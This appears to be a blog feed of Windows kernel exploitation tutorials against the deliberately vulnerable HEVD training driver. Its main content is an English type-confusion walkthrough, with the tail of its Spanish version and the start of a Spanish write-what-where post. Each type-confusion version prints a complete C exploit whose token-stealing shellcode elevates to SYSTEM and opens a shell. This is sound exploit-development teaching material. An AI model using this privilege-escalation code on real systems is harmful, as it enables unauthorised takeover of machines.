desarrollo de exploits: ¡no todas las vulnerabilidades desencadenarán un BSOD!\nEntonces, cómo sucedió esto? Dado que la Unión tiene un total de 4 bytes y nunca se inicializó, el Tipo de objeto ocupa el lugar del puntero de devolución de llamada.\nExplotación # Dado que es Windows 7 (x86) y no tenemos que preocuparnos por las protecciones de memoria modernas, la explotación es tan simple como llamar a nuestro shellcode en el área de usuario.\nEl PoC se puede ver hacia abajo:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_IOCTL_TYPE_CONFUSION IOCTL(0x808) /* Structure used by Type Confusion */ typedef struct _USER_TYPE_CONFUSION_OBJECT { ULONG_PTR ObjectID; ULONG_PTR ObjectType; } USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT; /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* Exploit(): Type Confusion */ int Exploit(HANDLE hHEVD) { USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = { 0 }; DWORD dwBytesReturned = 0; LPVOID lpvMemoryAllocation = NULL; char shellcode[]= /* sickle-tool -p windows/x86/kernel_token_stealer -f c -m pinpoint */ \u0026#34;\\x60\u0026#34; // pushal \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\u0026#34; // mov eax, dword ptr fs:[eax + 0x124] \u0026#34;\\x8b\\x40\\x50\u0026#34; // mov eax, dword ptr [eax + 0x50] \u0026#34;\\x89\\xc1\u0026#34; // mov ecx, eax \u0026#34;\\xba\\x04\\x00\\x00\\x00\u0026#34; // mov edx, 4 \u0026#34;\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov eax, dword ptr [eax + 0xb8] \u0026#34;\\x2d\\xb8\\x00\\x00\\x00\u0026#34; // sub eax, 0xb8 \u0026#34;\\x39\\x90\\xb4\\x00\\x00\\x00\u0026#34; // cmp dword ptr [eax + 0xb4], edx \u0026#34;\\x75\\xed\u0026#34; // jne 0x1014 \u0026#34;\\x8b\\x90\\xf8\\x00\\x00\\x00\u0026#34; // mov edx, dword ptr [eax + 0xf8] \u0026#34;\\x89\\x91\\xf8\\x00\\x00\\x00\u0026#34; // mov dword ptr [ecx + 0xf8], edx \u0026#34;\\x61\u0026#34; // popal /* Return to Userland */ \u0026#34;\\xc3\u0026#34;; // ret lpvMemoryAllocation = VirtualAlloc(NULL, 53, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvMemoryAllocation == NULL) { printf(\u0026#34;[*] Failed to allocate memory for shellcode\\n\u0026#34;); } printf(\u0026#34;[*] Allocated memory for shellcode, shellocode @{0x%p}\\n\u0026#34;, lpvMemoryAllocation); memcpy(lpvMemoryAllocation, shellcode, 53); UserTypeConfusionObject.ObjectType = (ULONG)lpvMemoryAllocation; UserTypeConfusionObject.ObjectID = 0x41414141; printf(\u0026#34;[*] Triggering type confusion\\n\u0026#34;); DeviceIoControl(hHEVD, HEVD_IOCTL_TYPE_CONFUSION, \u0026amp;UserTypeConfusionObject, sizeof(UserTypeConfusionObject), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation successful, enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Una vez enviado, obtenemos la ejecución del código :)\n","date":"10 January 2025","externalUrl":null,"permalink":"/posts/0x05-introducci%C3%B3n-a-windows-kernel-type-confusion-vulnerabilidades/","section":"Posts","summary":"","title":"0x05 - Introducción a Windows Kernel Type Confusion Vulnerabilidades","type":"posts"},{"content":" ₍₍ (ง ˙ω˙)ว ⁾⁾ Hablas Español? Empújame! In the last tutorial we exploited a \u0026ldquo;Write-What-Where\u0026rdquo; vulnerability within Windows 7 (x86) and Windows 11 (x64).\nAs with previous tutorials we will begin exploiting a new flaw against the Windows 7 (x86) kernel to get a solid foundation on how the vulnerability occurs. More specifically we will be learning about Type Confusions!\nTable of Contents # What is a Type Confusion (High Level) Using the Source TypeConfusionIoctlHandler TriggerTypeConfusion TypeConfusionObjectInitializer Dynamic Testing Exploitation What is a Type Confusion (High Level) # Not familiar with what a Type Confusion is? No problem! Let\u0026rsquo;s start with a quick high-level overview.\nTo use a non-technical example let\u0026rsquo;s look at a Dark Souls hypothetical. In the image below we see Siegmeyer of Catarina sitting outside the entrance to Sen\u0026rsquo;s Fortress.\nIf we zoom in, we can see that behind Siegmeyer there is an Estus Flask which operates like any flask, however in the Dark Souls universe it is used to replenish health.\nWithin Sen\u0026rsquo;s Fortress are enemies known as \u0026ldquo;Man-Serpent soldiers\u0026rdquo;, these enemies can be seen below. Being these are snakes, perhaps they also harbor venom.\nBeing that an Estus Flask holds a liquid, hypothetically one could swap out the liquid used to replenish health with something else or worst tamper it?\nSince Siegmeyer is currently absorbed in thought, if we opened the gate and he didn\u0026rsquo;t snap out of it, hypothetically a serpent could drink a sip of Estus and replace the amount they drank with poison! If Siegmeyer didn\u0026rsquo;t notice he\u0026rsquo;s finished!\nThis attack by the serpent is very similiar to that of a Type Confusion. A Type Confusion occurs when a program incorrectly assumes that an object or variable is of one type when it’s actually another. This kind of mismatch can lead to unintended behavior.\nWe can map this to our example:\nThe program (Siegmeyer) expects a specific type (health potion) based on the object (Estus Flask). An attacker (the serpent) changes the underlying data to a different type (poison) without the program realizing. The program (Siegmeyer) uses the object and it leads to catastrophic consequences. In technical terms this happens when programming language variable types are cast improperly, for example in C++ unsafe typecasting or JavaScript with loose typing. Attackers can then leverage these vulnerabilities to acheive memory corruption or even code execution.\nWith the high-level overview complete, let\u0026rsquo;s look at some code!\nUsing the Source # Let\u0026rsquo;s begin the search by identifying the appropriate files.\n$ ls -l | grep Type -rw-r--r-- 1 wetw0rk wetw0rk 7736 Oct 24 22:20 TypeConfusion.c -rw-r--r-- 1 wetw0rk wetw0rk 2954 Oct 24 22:20 TypeConfusion.h Looking at the source, we\u0026rsquo;re gonna be dealing with the following functions.\nTypeConfusionIoctlHandler() TriggerTypeConfusion() TypeConfusionObjectInitializer() TypeConfusionObjectCallback() Let\u0026rsquo;s take it from the top!\nTypeConfusionIoctlHandler # TypeConfusionIoctlHandler is the function that will get called when sending the IOCTL code. As with previous challenges, we’re getting our input casted into an object / structure. In this case PUSER_TYPE_CONFUSION_OBJECT.\n218 NTSTATUS 219 TypeConfusionIoctlHandler( 220 _In_ PIRP Irp, 221 _In_ PIO_STACK_LOCATION IrpSp 222 ) 223 { 224 NTSTATUS Status = STATUS_UNSUCCESSFUL; 225 PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = NULL; 226 227 UNREFERENCED_PARAMETER(Irp); 228 PAGED_CODE(); 229 230 UserTypeConfusionObject = (PUSER_TYPE_CONFUSION_OBJECT)IrpSp-\u0026gt;Parameters.DeviceIoControl.Type3InputBuffer; 231 232 if (UserTypeConfusionObject) 233 { 234 Status = TriggerTypeConfusion(UserTypeConfusionObject); 235 } 236 237 return Status; 238 } Let\u0026rsquo;s take a look at the structure PUSER_TYPE_CONFUSION_OBJECT within TypeConfusion.h.\nLooking at the source code file, we can also see another structure defined, this structure being _KERNEL_TYPE_CONFUSION_OBJECT.\n62 typedef struct _USER_TYPE_CONFUSION_OBJECT 63 { 64 ULONG_PTR ObjectID; 65 ULONG_PTR ObjectType; 66 } USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT; 67 68 #pragma warning(push) 69 #pragma warning(disable : 4201) 70 typedef struct _KERNEL_TYPE_CONFUSION_OBJECT 71 { 72 ULONG_PTR ObjectID; 73 union 74 { 75 ULONG_PTR ObjectType; 76 FunctionPointer Callback; 77 }; 78 } KERNEL_TYPE_CONFUSION_OBJECT, *PKERNEL_TYPE_CONFUSION_OBJECT; 79 #pragma warning(pop) If you\u0026rsquo;re familiar with C this is nothing too complicated. We see two unsigned long pointers when using the USER_TYPE_CONFUSION_OBJECT structure.\nAs for the _KERNEL_TYPE_CONFUSION_OBJECT structure we see a unsigned long pointer, and a union. Within the union we see an unsigned long pointer, and a function pointer.\nFrom an exploit development perspective this would be an ideal target, as FunctionPointer is a function pointer\u0026hellip; as the name implies.\nThis can further be seen in Common.h.\n70 typedef void(*FunctionPointer)(); TriggerTypeConfusion # TriggerTypeConfusion is where PUSER_TYPE_CONFUSION_OBJECT get\u0026rsquo;s passed, this function can be seen below.\n105 NTSTATUS 106 TriggerTypeConfusion( 107 _In_ PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject 108 ) 109 { 110 NTSTATUS Status = STATUS_UNSUCCESSFUL; 111 PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject = NULL; 112 113 PAGED_CODE(); 114 115 __try 116 { 117 // 118 // Verify if the buffer resides in user mode 119 // 120 121 ProbeForRead( 122 UserTypeConfusionObject, 123 sizeof(USER_TYPE_CONFUSION_OBJECT), 124 (ULONG)__alignof(UCHAR) 125 ); 126 127 // 128 // Allocate Pool chunk 129 // 130 131 KernelTypeConfusionObject = (PKERNEL_TYPE_CONFUSION_OBJECT)ExAllocatePoolWithTag( 132 NonPagedPool, 133 sizeof(KERNEL_TYPE_CONFUSION_OBJECT), 134 (ULONG)POOL_TAG 135 ); 136 137 if (!KernelTypeConfusionObject) 138 { 139 // 140 // Unable to allocate Pool chunk 141 // 142 143 DbgPrint(\u0026#34;[-] Unable to allocate Pool chunk\\n\u0026#34;); 144 145 Status = STATUS_NO_MEMORY; 146 return Status; 147 } 148 else 149 { 150 DbgPrint(\u0026#34;[+] Pool Tag: %s\\n\u0026#34;, STRINGIFY(POOL_TAG)); 151 DbgPrint(\u0026#34;[+] Pool Type: %s\\n\u0026#34;, STRINGIFY(NonPagedPool)); 152 DbgPrint(\u0026#34;[+] Pool Size: 0x%X\\n\u0026#34;, sizeof(KERNEL_TYPE_CONFUSION_OBJECT)); 153 DbgPrint(\u0026#34;[+] Pool Chunk: 0x%p\\n\u0026#34;, KernelTypeConfusionObject); 154 } 154 } 155 156 DbgPrint(\u0026#34;[+] UserTypeConfusionObject: 0x%p\\n\u0026#34;, UserTypeConfusionObject); 157 DbgPrint(\u0026#34;[+] KernelTypeConfusionObject: 0x%p\\n\u0026#34;, KernelTypeConfusionObject); 158 DbgPrint(\u0026#34;[+] KernelTypeConfusionObject Size: 0x%X\\n\u0026#34;, sizeof(KERNEL_TYPE_CONFUSION_OBJECT)); 159 160 KernelTypeConfusionObject-\u0026gt;ObjectID = UserTypeConfusionObject-\u0026gt;ObjectID; 161 KernelTypeConfusionObject-\u0026gt;ObjectType = UserTypeConfusionObject-\u0026gt;ObjectType; 162 163 DbgPrint(\u0026#34;[+] KernelTypeConfusionObject-\u0026gt;ObjectID: 0x%p\\n\u0026#34;, KernelTypeConfusionObject-\u0026gt;ObjectID); 164 DbgPrint(\u0026#34;[+] KernelTypeConfusionObject-\u0026gt;ObjectType: 0x%p\\n\u0026#34;, KernelTypeConfusionObject-\u0026gt;ObjectType); 165 166 167 #ifdef SECURE 168 // 169 // Secure Note: This is secure because the developer is properly setting \u0026#39;Callback\u0026#39; 170 // member of the \u0026#39;KERNEL_TYPE_CONFUSION_OBJECT\u0026#39; structure before passing the pointer 171 // of \u0026#39;KernelTypeConfusionObject\u0026#39; to \u0026#39;TypeConfusionObjectInitializer()\u0026#39; function as 172 // parameter 173 // 174 175 KernelTypeConfusionObject-\u0026gt;Callback = \u0026amp;TypeConfusionObjectCallback; 176 Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject); 177 #else 178 DbgPrint(\u0026#34;[+] Triggering Type Confusion\\n\u0026#34;); 179 180 // 181 // Vulnerability Note: This is a vanilla Type Confusion vulnerability due to improper 182 // use of the \u0026#39;UNION\u0026#39; construct. The developer has not set the \u0026#39;Callback\u0026#39; member of 183 // the \u0026#39;KERNEL_TYPE_CONFUSION_OBJECT\u0026#39; structure before passing the pointer of 184 // \u0026#39;KernelTypeConfusionObject\u0026#39; to \u0026#39;TypeConfusionObjectInitializer()\u0026#39; function as 185 // parameter 186 // 187 188 Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject); 189 #endif 190 191 DbgPrint(\u0026#34;[+] Freeing KernelTypeConfusionObject Object\\n\u0026#34;); 192 DbgPrint(\u0026#34;[+] Pool Tag: %s\\n\u0026#34;, STRINGIFY(POOL_TAG)); 193 DbgPrint(\u0026#34;[+] Pool Chunk: 0x%p\\n\u0026#34;, KernelTypeConfusionObject); 194 195 // 196 // Free the allocated Pool chunk 197 // 198 199 ExFreePoolWithTag((PVOID)KernelTypeConfusionObject, (ULONG)POOL_TAG); 200 KernelTypeConfusionObject = NULL; 201 } 202 __except (EXCEPTION_EXECUTE_HANDLER) 203 { 204 Status = GetExceptionCode(); 205 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 206 } 206 } 207 208 return Status; 209 } As with all large functions, let\u0026rsquo;s break this down. First, we allocate a PKERNEL_TYPE_CONFUSION_OBJECT object in the NonPagedPool.\n131 KernelTypeConfusionObject = (PKERNEL_TYPE_CONFUSION_OBJECT)ExAllocatePoolWithTag( 132 NonPagedPool, 133 sizeof(KERNEL_TYPE_CONFUSION_OBJECT), 134 (ULONG)POOL_TAG 135 ); From there assuming everything went well, the driver assigns the ObjectID, and ObjectType members to the KernelTypeConfusionObject structure we allocated using our input.\n160 KernelTypeConfusionObject-\u0026gt;ObjectID = UserTypeConfusionObject-\u0026gt;ObjectID; 161 KernelTypeConfusionObject-\u0026gt;ObjectType = UserTypeConfusionObject-\u0026gt;ObjectType; We then call TypeConfusionObjectInitializer using this object as it\u0026rsquo;s only parameter.\n188 Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject); We\u0026rsquo;ll skip looking into this function for now, however the returned type is that of NTSTATUS.\nFinishing off this code analysis, we can see that the allocated object get\u0026rsquo;s free\u0026rsquo;d then NULL\u0026rsquo;d out.\n191 DbgPrint(\u0026#34;[+] Freeing KernelTypeConfusionObject Object\\n\u0026#34;); 192 DbgPrint(\u0026#34;[+] Pool Tag: %s\\n\u0026#34;, STRINGIFY(POOL_TAG)); 193 DbgPrint(\u0026#34;[+] Pool Chunk: 0x%p\\n\u0026#34;, KernelTypeConfusionObject); 194 195 // 196 // Free the allocated Pool chunk 197 // 198 199 ExFreePoolWithTag((PVOID)KernelTypeConfusionObject, (ULONG)POOL_TAG); 200 KernelTypeConfusionObject = NULL; 201 } 202 __except (EXCEPTION_EXECUTE_HANDLER) 203 { 204 Status = GetExceptionCode(); 205 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 206 } 207 208 return Status; 209 } The main thing to note about this function is that the Callback member is never set. We may be able to use this to our advantage\u0026hellip;\nTypeConfusionObjectInitializer # To recap the PKERNEL_TYPE_CONFUSION_OBJECT gets passed into the TypeConfusionObjectInitializer function from the TriggerTypeConfusion function.\nWe can see the source for TypeConfusionObjectInitializer below.\n80 NTSTATUS 81 TypeConfusionObjectInitializer( 82 _In_ PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject 83 ) 84 { 85 NTSTATUS Status = STATUS_SUCCESS; 86 87 PAGED_CODE(); 88 89 DbgPrint(\u0026#34;[+] KernelTypeConfusionObject-\u0026gt;Callback: 0x%p\\n\u0026#34;, KernelTypeConfusionObject-\u0026gt;Callback); 90 DbgPrint(\u0026#34;[+] Calling Callback\\n\u0026#34;); 91 92 KernelTypeConfusionObject-\u0026gt;Callback(); 93 94 DbgPrint(\u0026#34;[+] Kernel Type Confusion Object Initialized\\n\u0026#34;); 95 96 return Status; 97 } Intresting\u0026hellip; it looks like we just call the Callback() member\u0026hellip; I wonder if when we write to the KernelTypeConfusionObject we could overwrite or rather assign the adjacent memory some of our buffer?\nDynamic Testing # At this point I felt I had a solid understanding of how this function works, so I decided to start messing with it and observing behavior.\nWith that I had the following PoC.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_IOCTL_TYPE_CONFUSION IOCTL(0x808) typedef struct _USER_TYPE_CONFUSION_OBJECT { ULONG_PTR ObjectID; ULONG_PTR ObjectType; } USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT; int Exploit(HANDLE hHEVD) { USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = { 0 }; ULONG oId = 0x41414141; ULONG oType = 0x42424242; DWORD dwBytesReturned = 0; UserTypeConfusionObject.ObjectType = oType; UserTypeConfusionObject.ObjectID = oId; DeviceIoControl(hHEVD, HEVD_IOCTL_TYPE_CONFUSION, \u0026amp;UserTypeConfusionObject, sizeof(UserTypeConfusionObject), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return 0; } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } Exploit(hHEVD); if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Let\u0026rsquo;s set a breakpoint right when we call the TypeConfusionInitializer function to see what is passed into the function.\nOnce hit we can see that the pointer to our object (stored at the top of the stack) contains a buffer of 16 bytes. That’s approximately 8 more bytes than expected.\nIf we look at this from the perspective of the structure itself it should only be 8 bytes.\n$ gcc struct_size.c -m32 $ ./a.out Sizeof USER_TYPE_CONFUSION_OBJECT : 8 Sizeof KERNEL_TYPE_CONFUSION_OBJECT : 8 But wait shouldn\u0026rsquo;t the KERNEL_TYPE_CONFUSION_OBJECT be 12 bytes \u0026ldquo;(sizeof(ULONG_PTR) + sizeof(ULONG_PTR) + sizeof(FunctionPointer))\u0026rdquo;?\nAfter some googling it appears that the size of a union is determined by the size of its largest member.\nSo, this allocation is 8 bytes??\nKernelTypeConfusionObject = (PKERNEL_TYPE_CONFUSION_OBJECT)ExAllocatePoolWithTag( NonPagedPool, sizeof(KERNEL_TYPE_CONFUSION_OBJECT), (ULONG)POOL_TAG ); Let\u0026rsquo;s re-run it, this time breaking at the call to ExAllocatePoolWithTag.\nIntresting\u0026hellip; as expected it\u0026rsquo;s 8 bytes\u0026hellip;\nNow let\u0026rsquo;s see what\u0026rsquo;s passed into TypeConfusionObjectInitializer.\nThis time we don\u0026rsquo;t see more than expected data, but we can see that the Callback is an invalid address.\nIf we continue to step we eventually get to the Callback function call. Once there, we can see that we\u0026rsquo;re actually calling an invalid address.\nMore specifically our input.\nIf we step once more, we can see we successfully trigger a crash.\nHowever, the kernel did not crash! If you continue execution, you\u0026rsquo;ll notice Windows continues normal behavior. This is really important to know from a exploit development perspective - not all vulnerabilities will trigger a BSOD!\nSo how did this happen? Since the Union is 4 bytes total and never initialized the ObjectType takes the place of the Callback pointer.\nPretty cool!\nExploitation # Since this is Windows 7 (x86) and we don\u0026rsquo;t have to worry about modern memory protections, exploitation is as simple as calling our shellcode in userland.\nThe PoC can be seen below:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_IOCTL_TYPE_CONFUSION IOCTL(0x808) /* Structure used by Type Confusion */ typedef struct _USER_TYPE_CONFUSION_OBJECT { ULONG_PTR ObjectID; ULONG_PTR ObjectType; } USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT; /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* Exploit(): Type Confusion */ int Exploit(HANDLE hHEVD) { USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = { 0 }; DWORD dwBytesReturned = 0; LPVOID lpvMemoryAllocation = NULL; char shellcode[]= /* sickle-tool -p windows/x86/kernel_token_stealer -f c -m pinpoint */ \u0026#34;\\x60\u0026#34; // pushal \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\u0026#34; // mov eax, dword ptr fs:[eax + 0x124] \u0026#34;\\x8b\\x40\\x50\u0026#34; // mov eax, dword ptr [eax + 0x50] \u0026#34;\\x89\\xc1\u0026#34; // mov ecx, eax \u0026#34;\\xba\\x04\\x00\\x00\\x00\u0026#34; // mov edx, 4 \u0026#34;\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov eax, dword ptr [eax + 0xb8] \u0026#34;\\x2d\\xb8\\x00\\x00\\x00\u0026#34; // sub eax, 0xb8 \u0026#34;\\x39\\x90\\xb4\\x00\\x00\\x00\u0026#34; // cmp dword ptr [eax + 0xb4], edx \u0026#34;\\x75\\xed\u0026#34; // jne 0x1014 \u0026#34;\\x8b\\x90\\xf8\\x00\\x00\\x00\u0026#34; // mov edx, dword ptr [eax + 0xf8] \u0026#34;\\x89\\x91\\xf8\\x00\\x00\\x00\u0026#34; // mov dword ptr [ecx + 0xf8], edx \u0026#34;\\x61\u0026#34; // popal /* Return to Userland */ \u0026#34;\\xc3\u0026#34;; // ret lpvMemoryAllocation = VirtualAlloc(NULL, 53, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvMemoryAllocation == NULL) { printf(\u0026#34;[*] Failed to allocate memory for shellcode\\n\u0026#34;); } printf(\u0026#34;[*] Allocated memory for shellcode, shellocode @{0x%p}\\n\u0026#34;, lpvMemoryAllocation); memcpy(lpvMemoryAllocation, shellcode, 53); UserTypeConfusionObject.ObjectType = (ULONG)lpvMemoryAllocation; UserTypeConfusionObject.ObjectID = 0x41414141; printf(\u0026#34;[*] Triggering type confusion\\n\u0026#34;); DeviceIoControl(hHEVD, HEVD_IOCTL_TYPE_CONFUSION, \u0026amp;UserTypeConfusionObject, sizeof(UserTypeConfusionObject), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation successful, enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Once sent, we get code execution :)\n","date":"9 January 2025","externalUrl":null,"permalink":"/posts/0x05-introduction-to-windows-kernel-type-confusion-vulnerabilities/","section":"Posts","summary":"","title":"0x05 - Introduction to Windows Kernel Type Confusion Vulnerabilities","type":"posts"},{"content":"Si has seguido los tutoriales desde el principio, sientete orgulloso de superar el \u0026ldquo;Use After Free\u0026rdquo; en el Windows Kernel! Ahora vamos a aprovechar un \u0026ldquo;Write What Where\u0026rdquo; vulnerabilidad en Windows 7 (x86) y luego proceder a adaptar lo que aprendemos a Windows 11 (x64). La traducción de esta vulnerabilidad en español sería \u0026ldquo;Escribir, Qué, Dónde\u0026rdquo;.\nPodría decirse que este es uno de los tipos de vulnerabilidades más poderosos - que personalmente prefiero llamar \u0026ldquo;escritura arbitraria\u0026rdquo;, ya que así es como lo llamaban mis amigos antes de que yo hubiera oído de \u0026ldquo;Write What Where\u0026rdquo;. Sin embargo, \u0026ldquo;Escribir, Qué, Dónde\u0026rdquo; puede ser en realidad un término mejor ya que tiene una correlación directa con lo que hace el error, mientras que \u0026ldquo;escritura arbitraria\u0026rdquo; es más amplio.\nComo quieras llamarlo, no importa :)\nTable of Contents # Qué es un \u0026ldquo;Escribir, Qué, Dónde\u0026rdquo; (Alto Nivel) Windows 7 (x86) Usando el Código ArbitraryWriteIoctlHandler Explotación Windows 11 (x64) Ingeniería Inversa Explotación Qué es un \u0026ldquo;Escribir, Qué, Dónde\u0026rdquo; (Alto Nivel) # En caso de que no estés familiarizado con que es un \u0026ldquo;Escribir, Qué, Dónde\u0026rdquo; vulnerabilidad, comencemos con una descripción general de lo que es.\nPara usar un ejemplo no técnico, hay un episodio de SpongeBob SquarePants dónde SpongeBob y Patrick tiene una pelea de bolas de nieve. En la imagen de abajo, vemos una imagen del episodio.\nNormalmente, cuando haces una bola de nieve, le das la forma de un círculo. Sin embargo, como se ve en la imagen arriba, Patrick en realidad los convierte cuadrados. En realidad, Patrick muchas formas diferentes:\nAunque Patrick en realidad no gana la pelea, demuestra las características de un hacker que se aprovecha de una vulnerabilidad de \u0026ldquo;Escribir, Qué, Dónde\u0026rdquo;. En el episodio, Patrick está tirando cualquier forma que quiere (Escribir), creado a de nieve (Qué), y enviándolo a Spongebob (Dónde).\nDe manera similar, en el contexto de una vulnerabilidad de seguridad, un atacante puede escribir información arbitrario - puede ser cualquier cosa, como una cuerda, un número entero o un objeto más complejo. Como Patrick, El atacante también puede elegir dónde enviar esta información, yendo a partes específicas de memoria.\nEsta capacidad de controlar tanto la información como su destino hace que las vulnerabilidades \u0026ldquo;Escribir, Qué, Dónde\u0026rdquo; sean peligrosas, ya que pueden provocar corrupción de la memoria, aumento de privilegios o incluso ejecución de código arbitrario.\nWindows 7 (x86) # Al igual que con los últimos tutoriales, comenzaremos con Windows 7 (x86). Debido a la complejidad de la explotación, incluiremos dos exploits en este tutorial!\nDicho esto, ejecuta tu máquina virtual de Windows 7 (x86)!\nUsando el Código # Al igual que con el UaF veamos el terreno ( ✧≖ ͜ʖ≖)\n$ find . -name \u0026#34;ArbitraryWrite*\u0026#34; ./Driver/HEVD/ArbitraryWrite.h ./Driver/HEVD/ArbitraryWrite.c A diferencia de las últimas dos vulnerabilidades, no estamos lidiando con muchas \u0026ldquo;Handler\u0026rdquo; funciones, estaremos principalmente mirando ArbitraryWriteIoctlHandler.\nArbitraryWriteIoctlHandler() ArbitraryWriteIoctlHandler # Mirando esto handler (ArbitraryWrite.c), podemos ver que nuestra entrada de usuario finalmente se pasará a TriggerArbitraryWrite().\n134 NTSTATUS 135 ArbitraryWriteIoctlHandler( 136 _In_ PIRP Irp, 137 _In_ PIO_STACK_LOCATION IrpSp 138 ) 139 { 140 NTSTATUS Status = STATUS_UNSUCCESSFUL; 141 PWRITE_WHAT_WHERE UserWriteWhatWhere = NULL; 142 143 UNREFERENCED_PARAMETER(Irp); 144 PAGED_CODE(); 145 146 UserWriteWhatWhere = (PWRITE_WHAT_WHERE)IrpSp-\u0026gt;Parameters.DeviceIoControl.Type3InputBuffer; 147 148 if (UserWriteWhatWhere) 149 { 150 Status = TriggerArbitraryWrite(UserWriteWhatWhere); 151 } 152 153 return Status; 154 } Sin 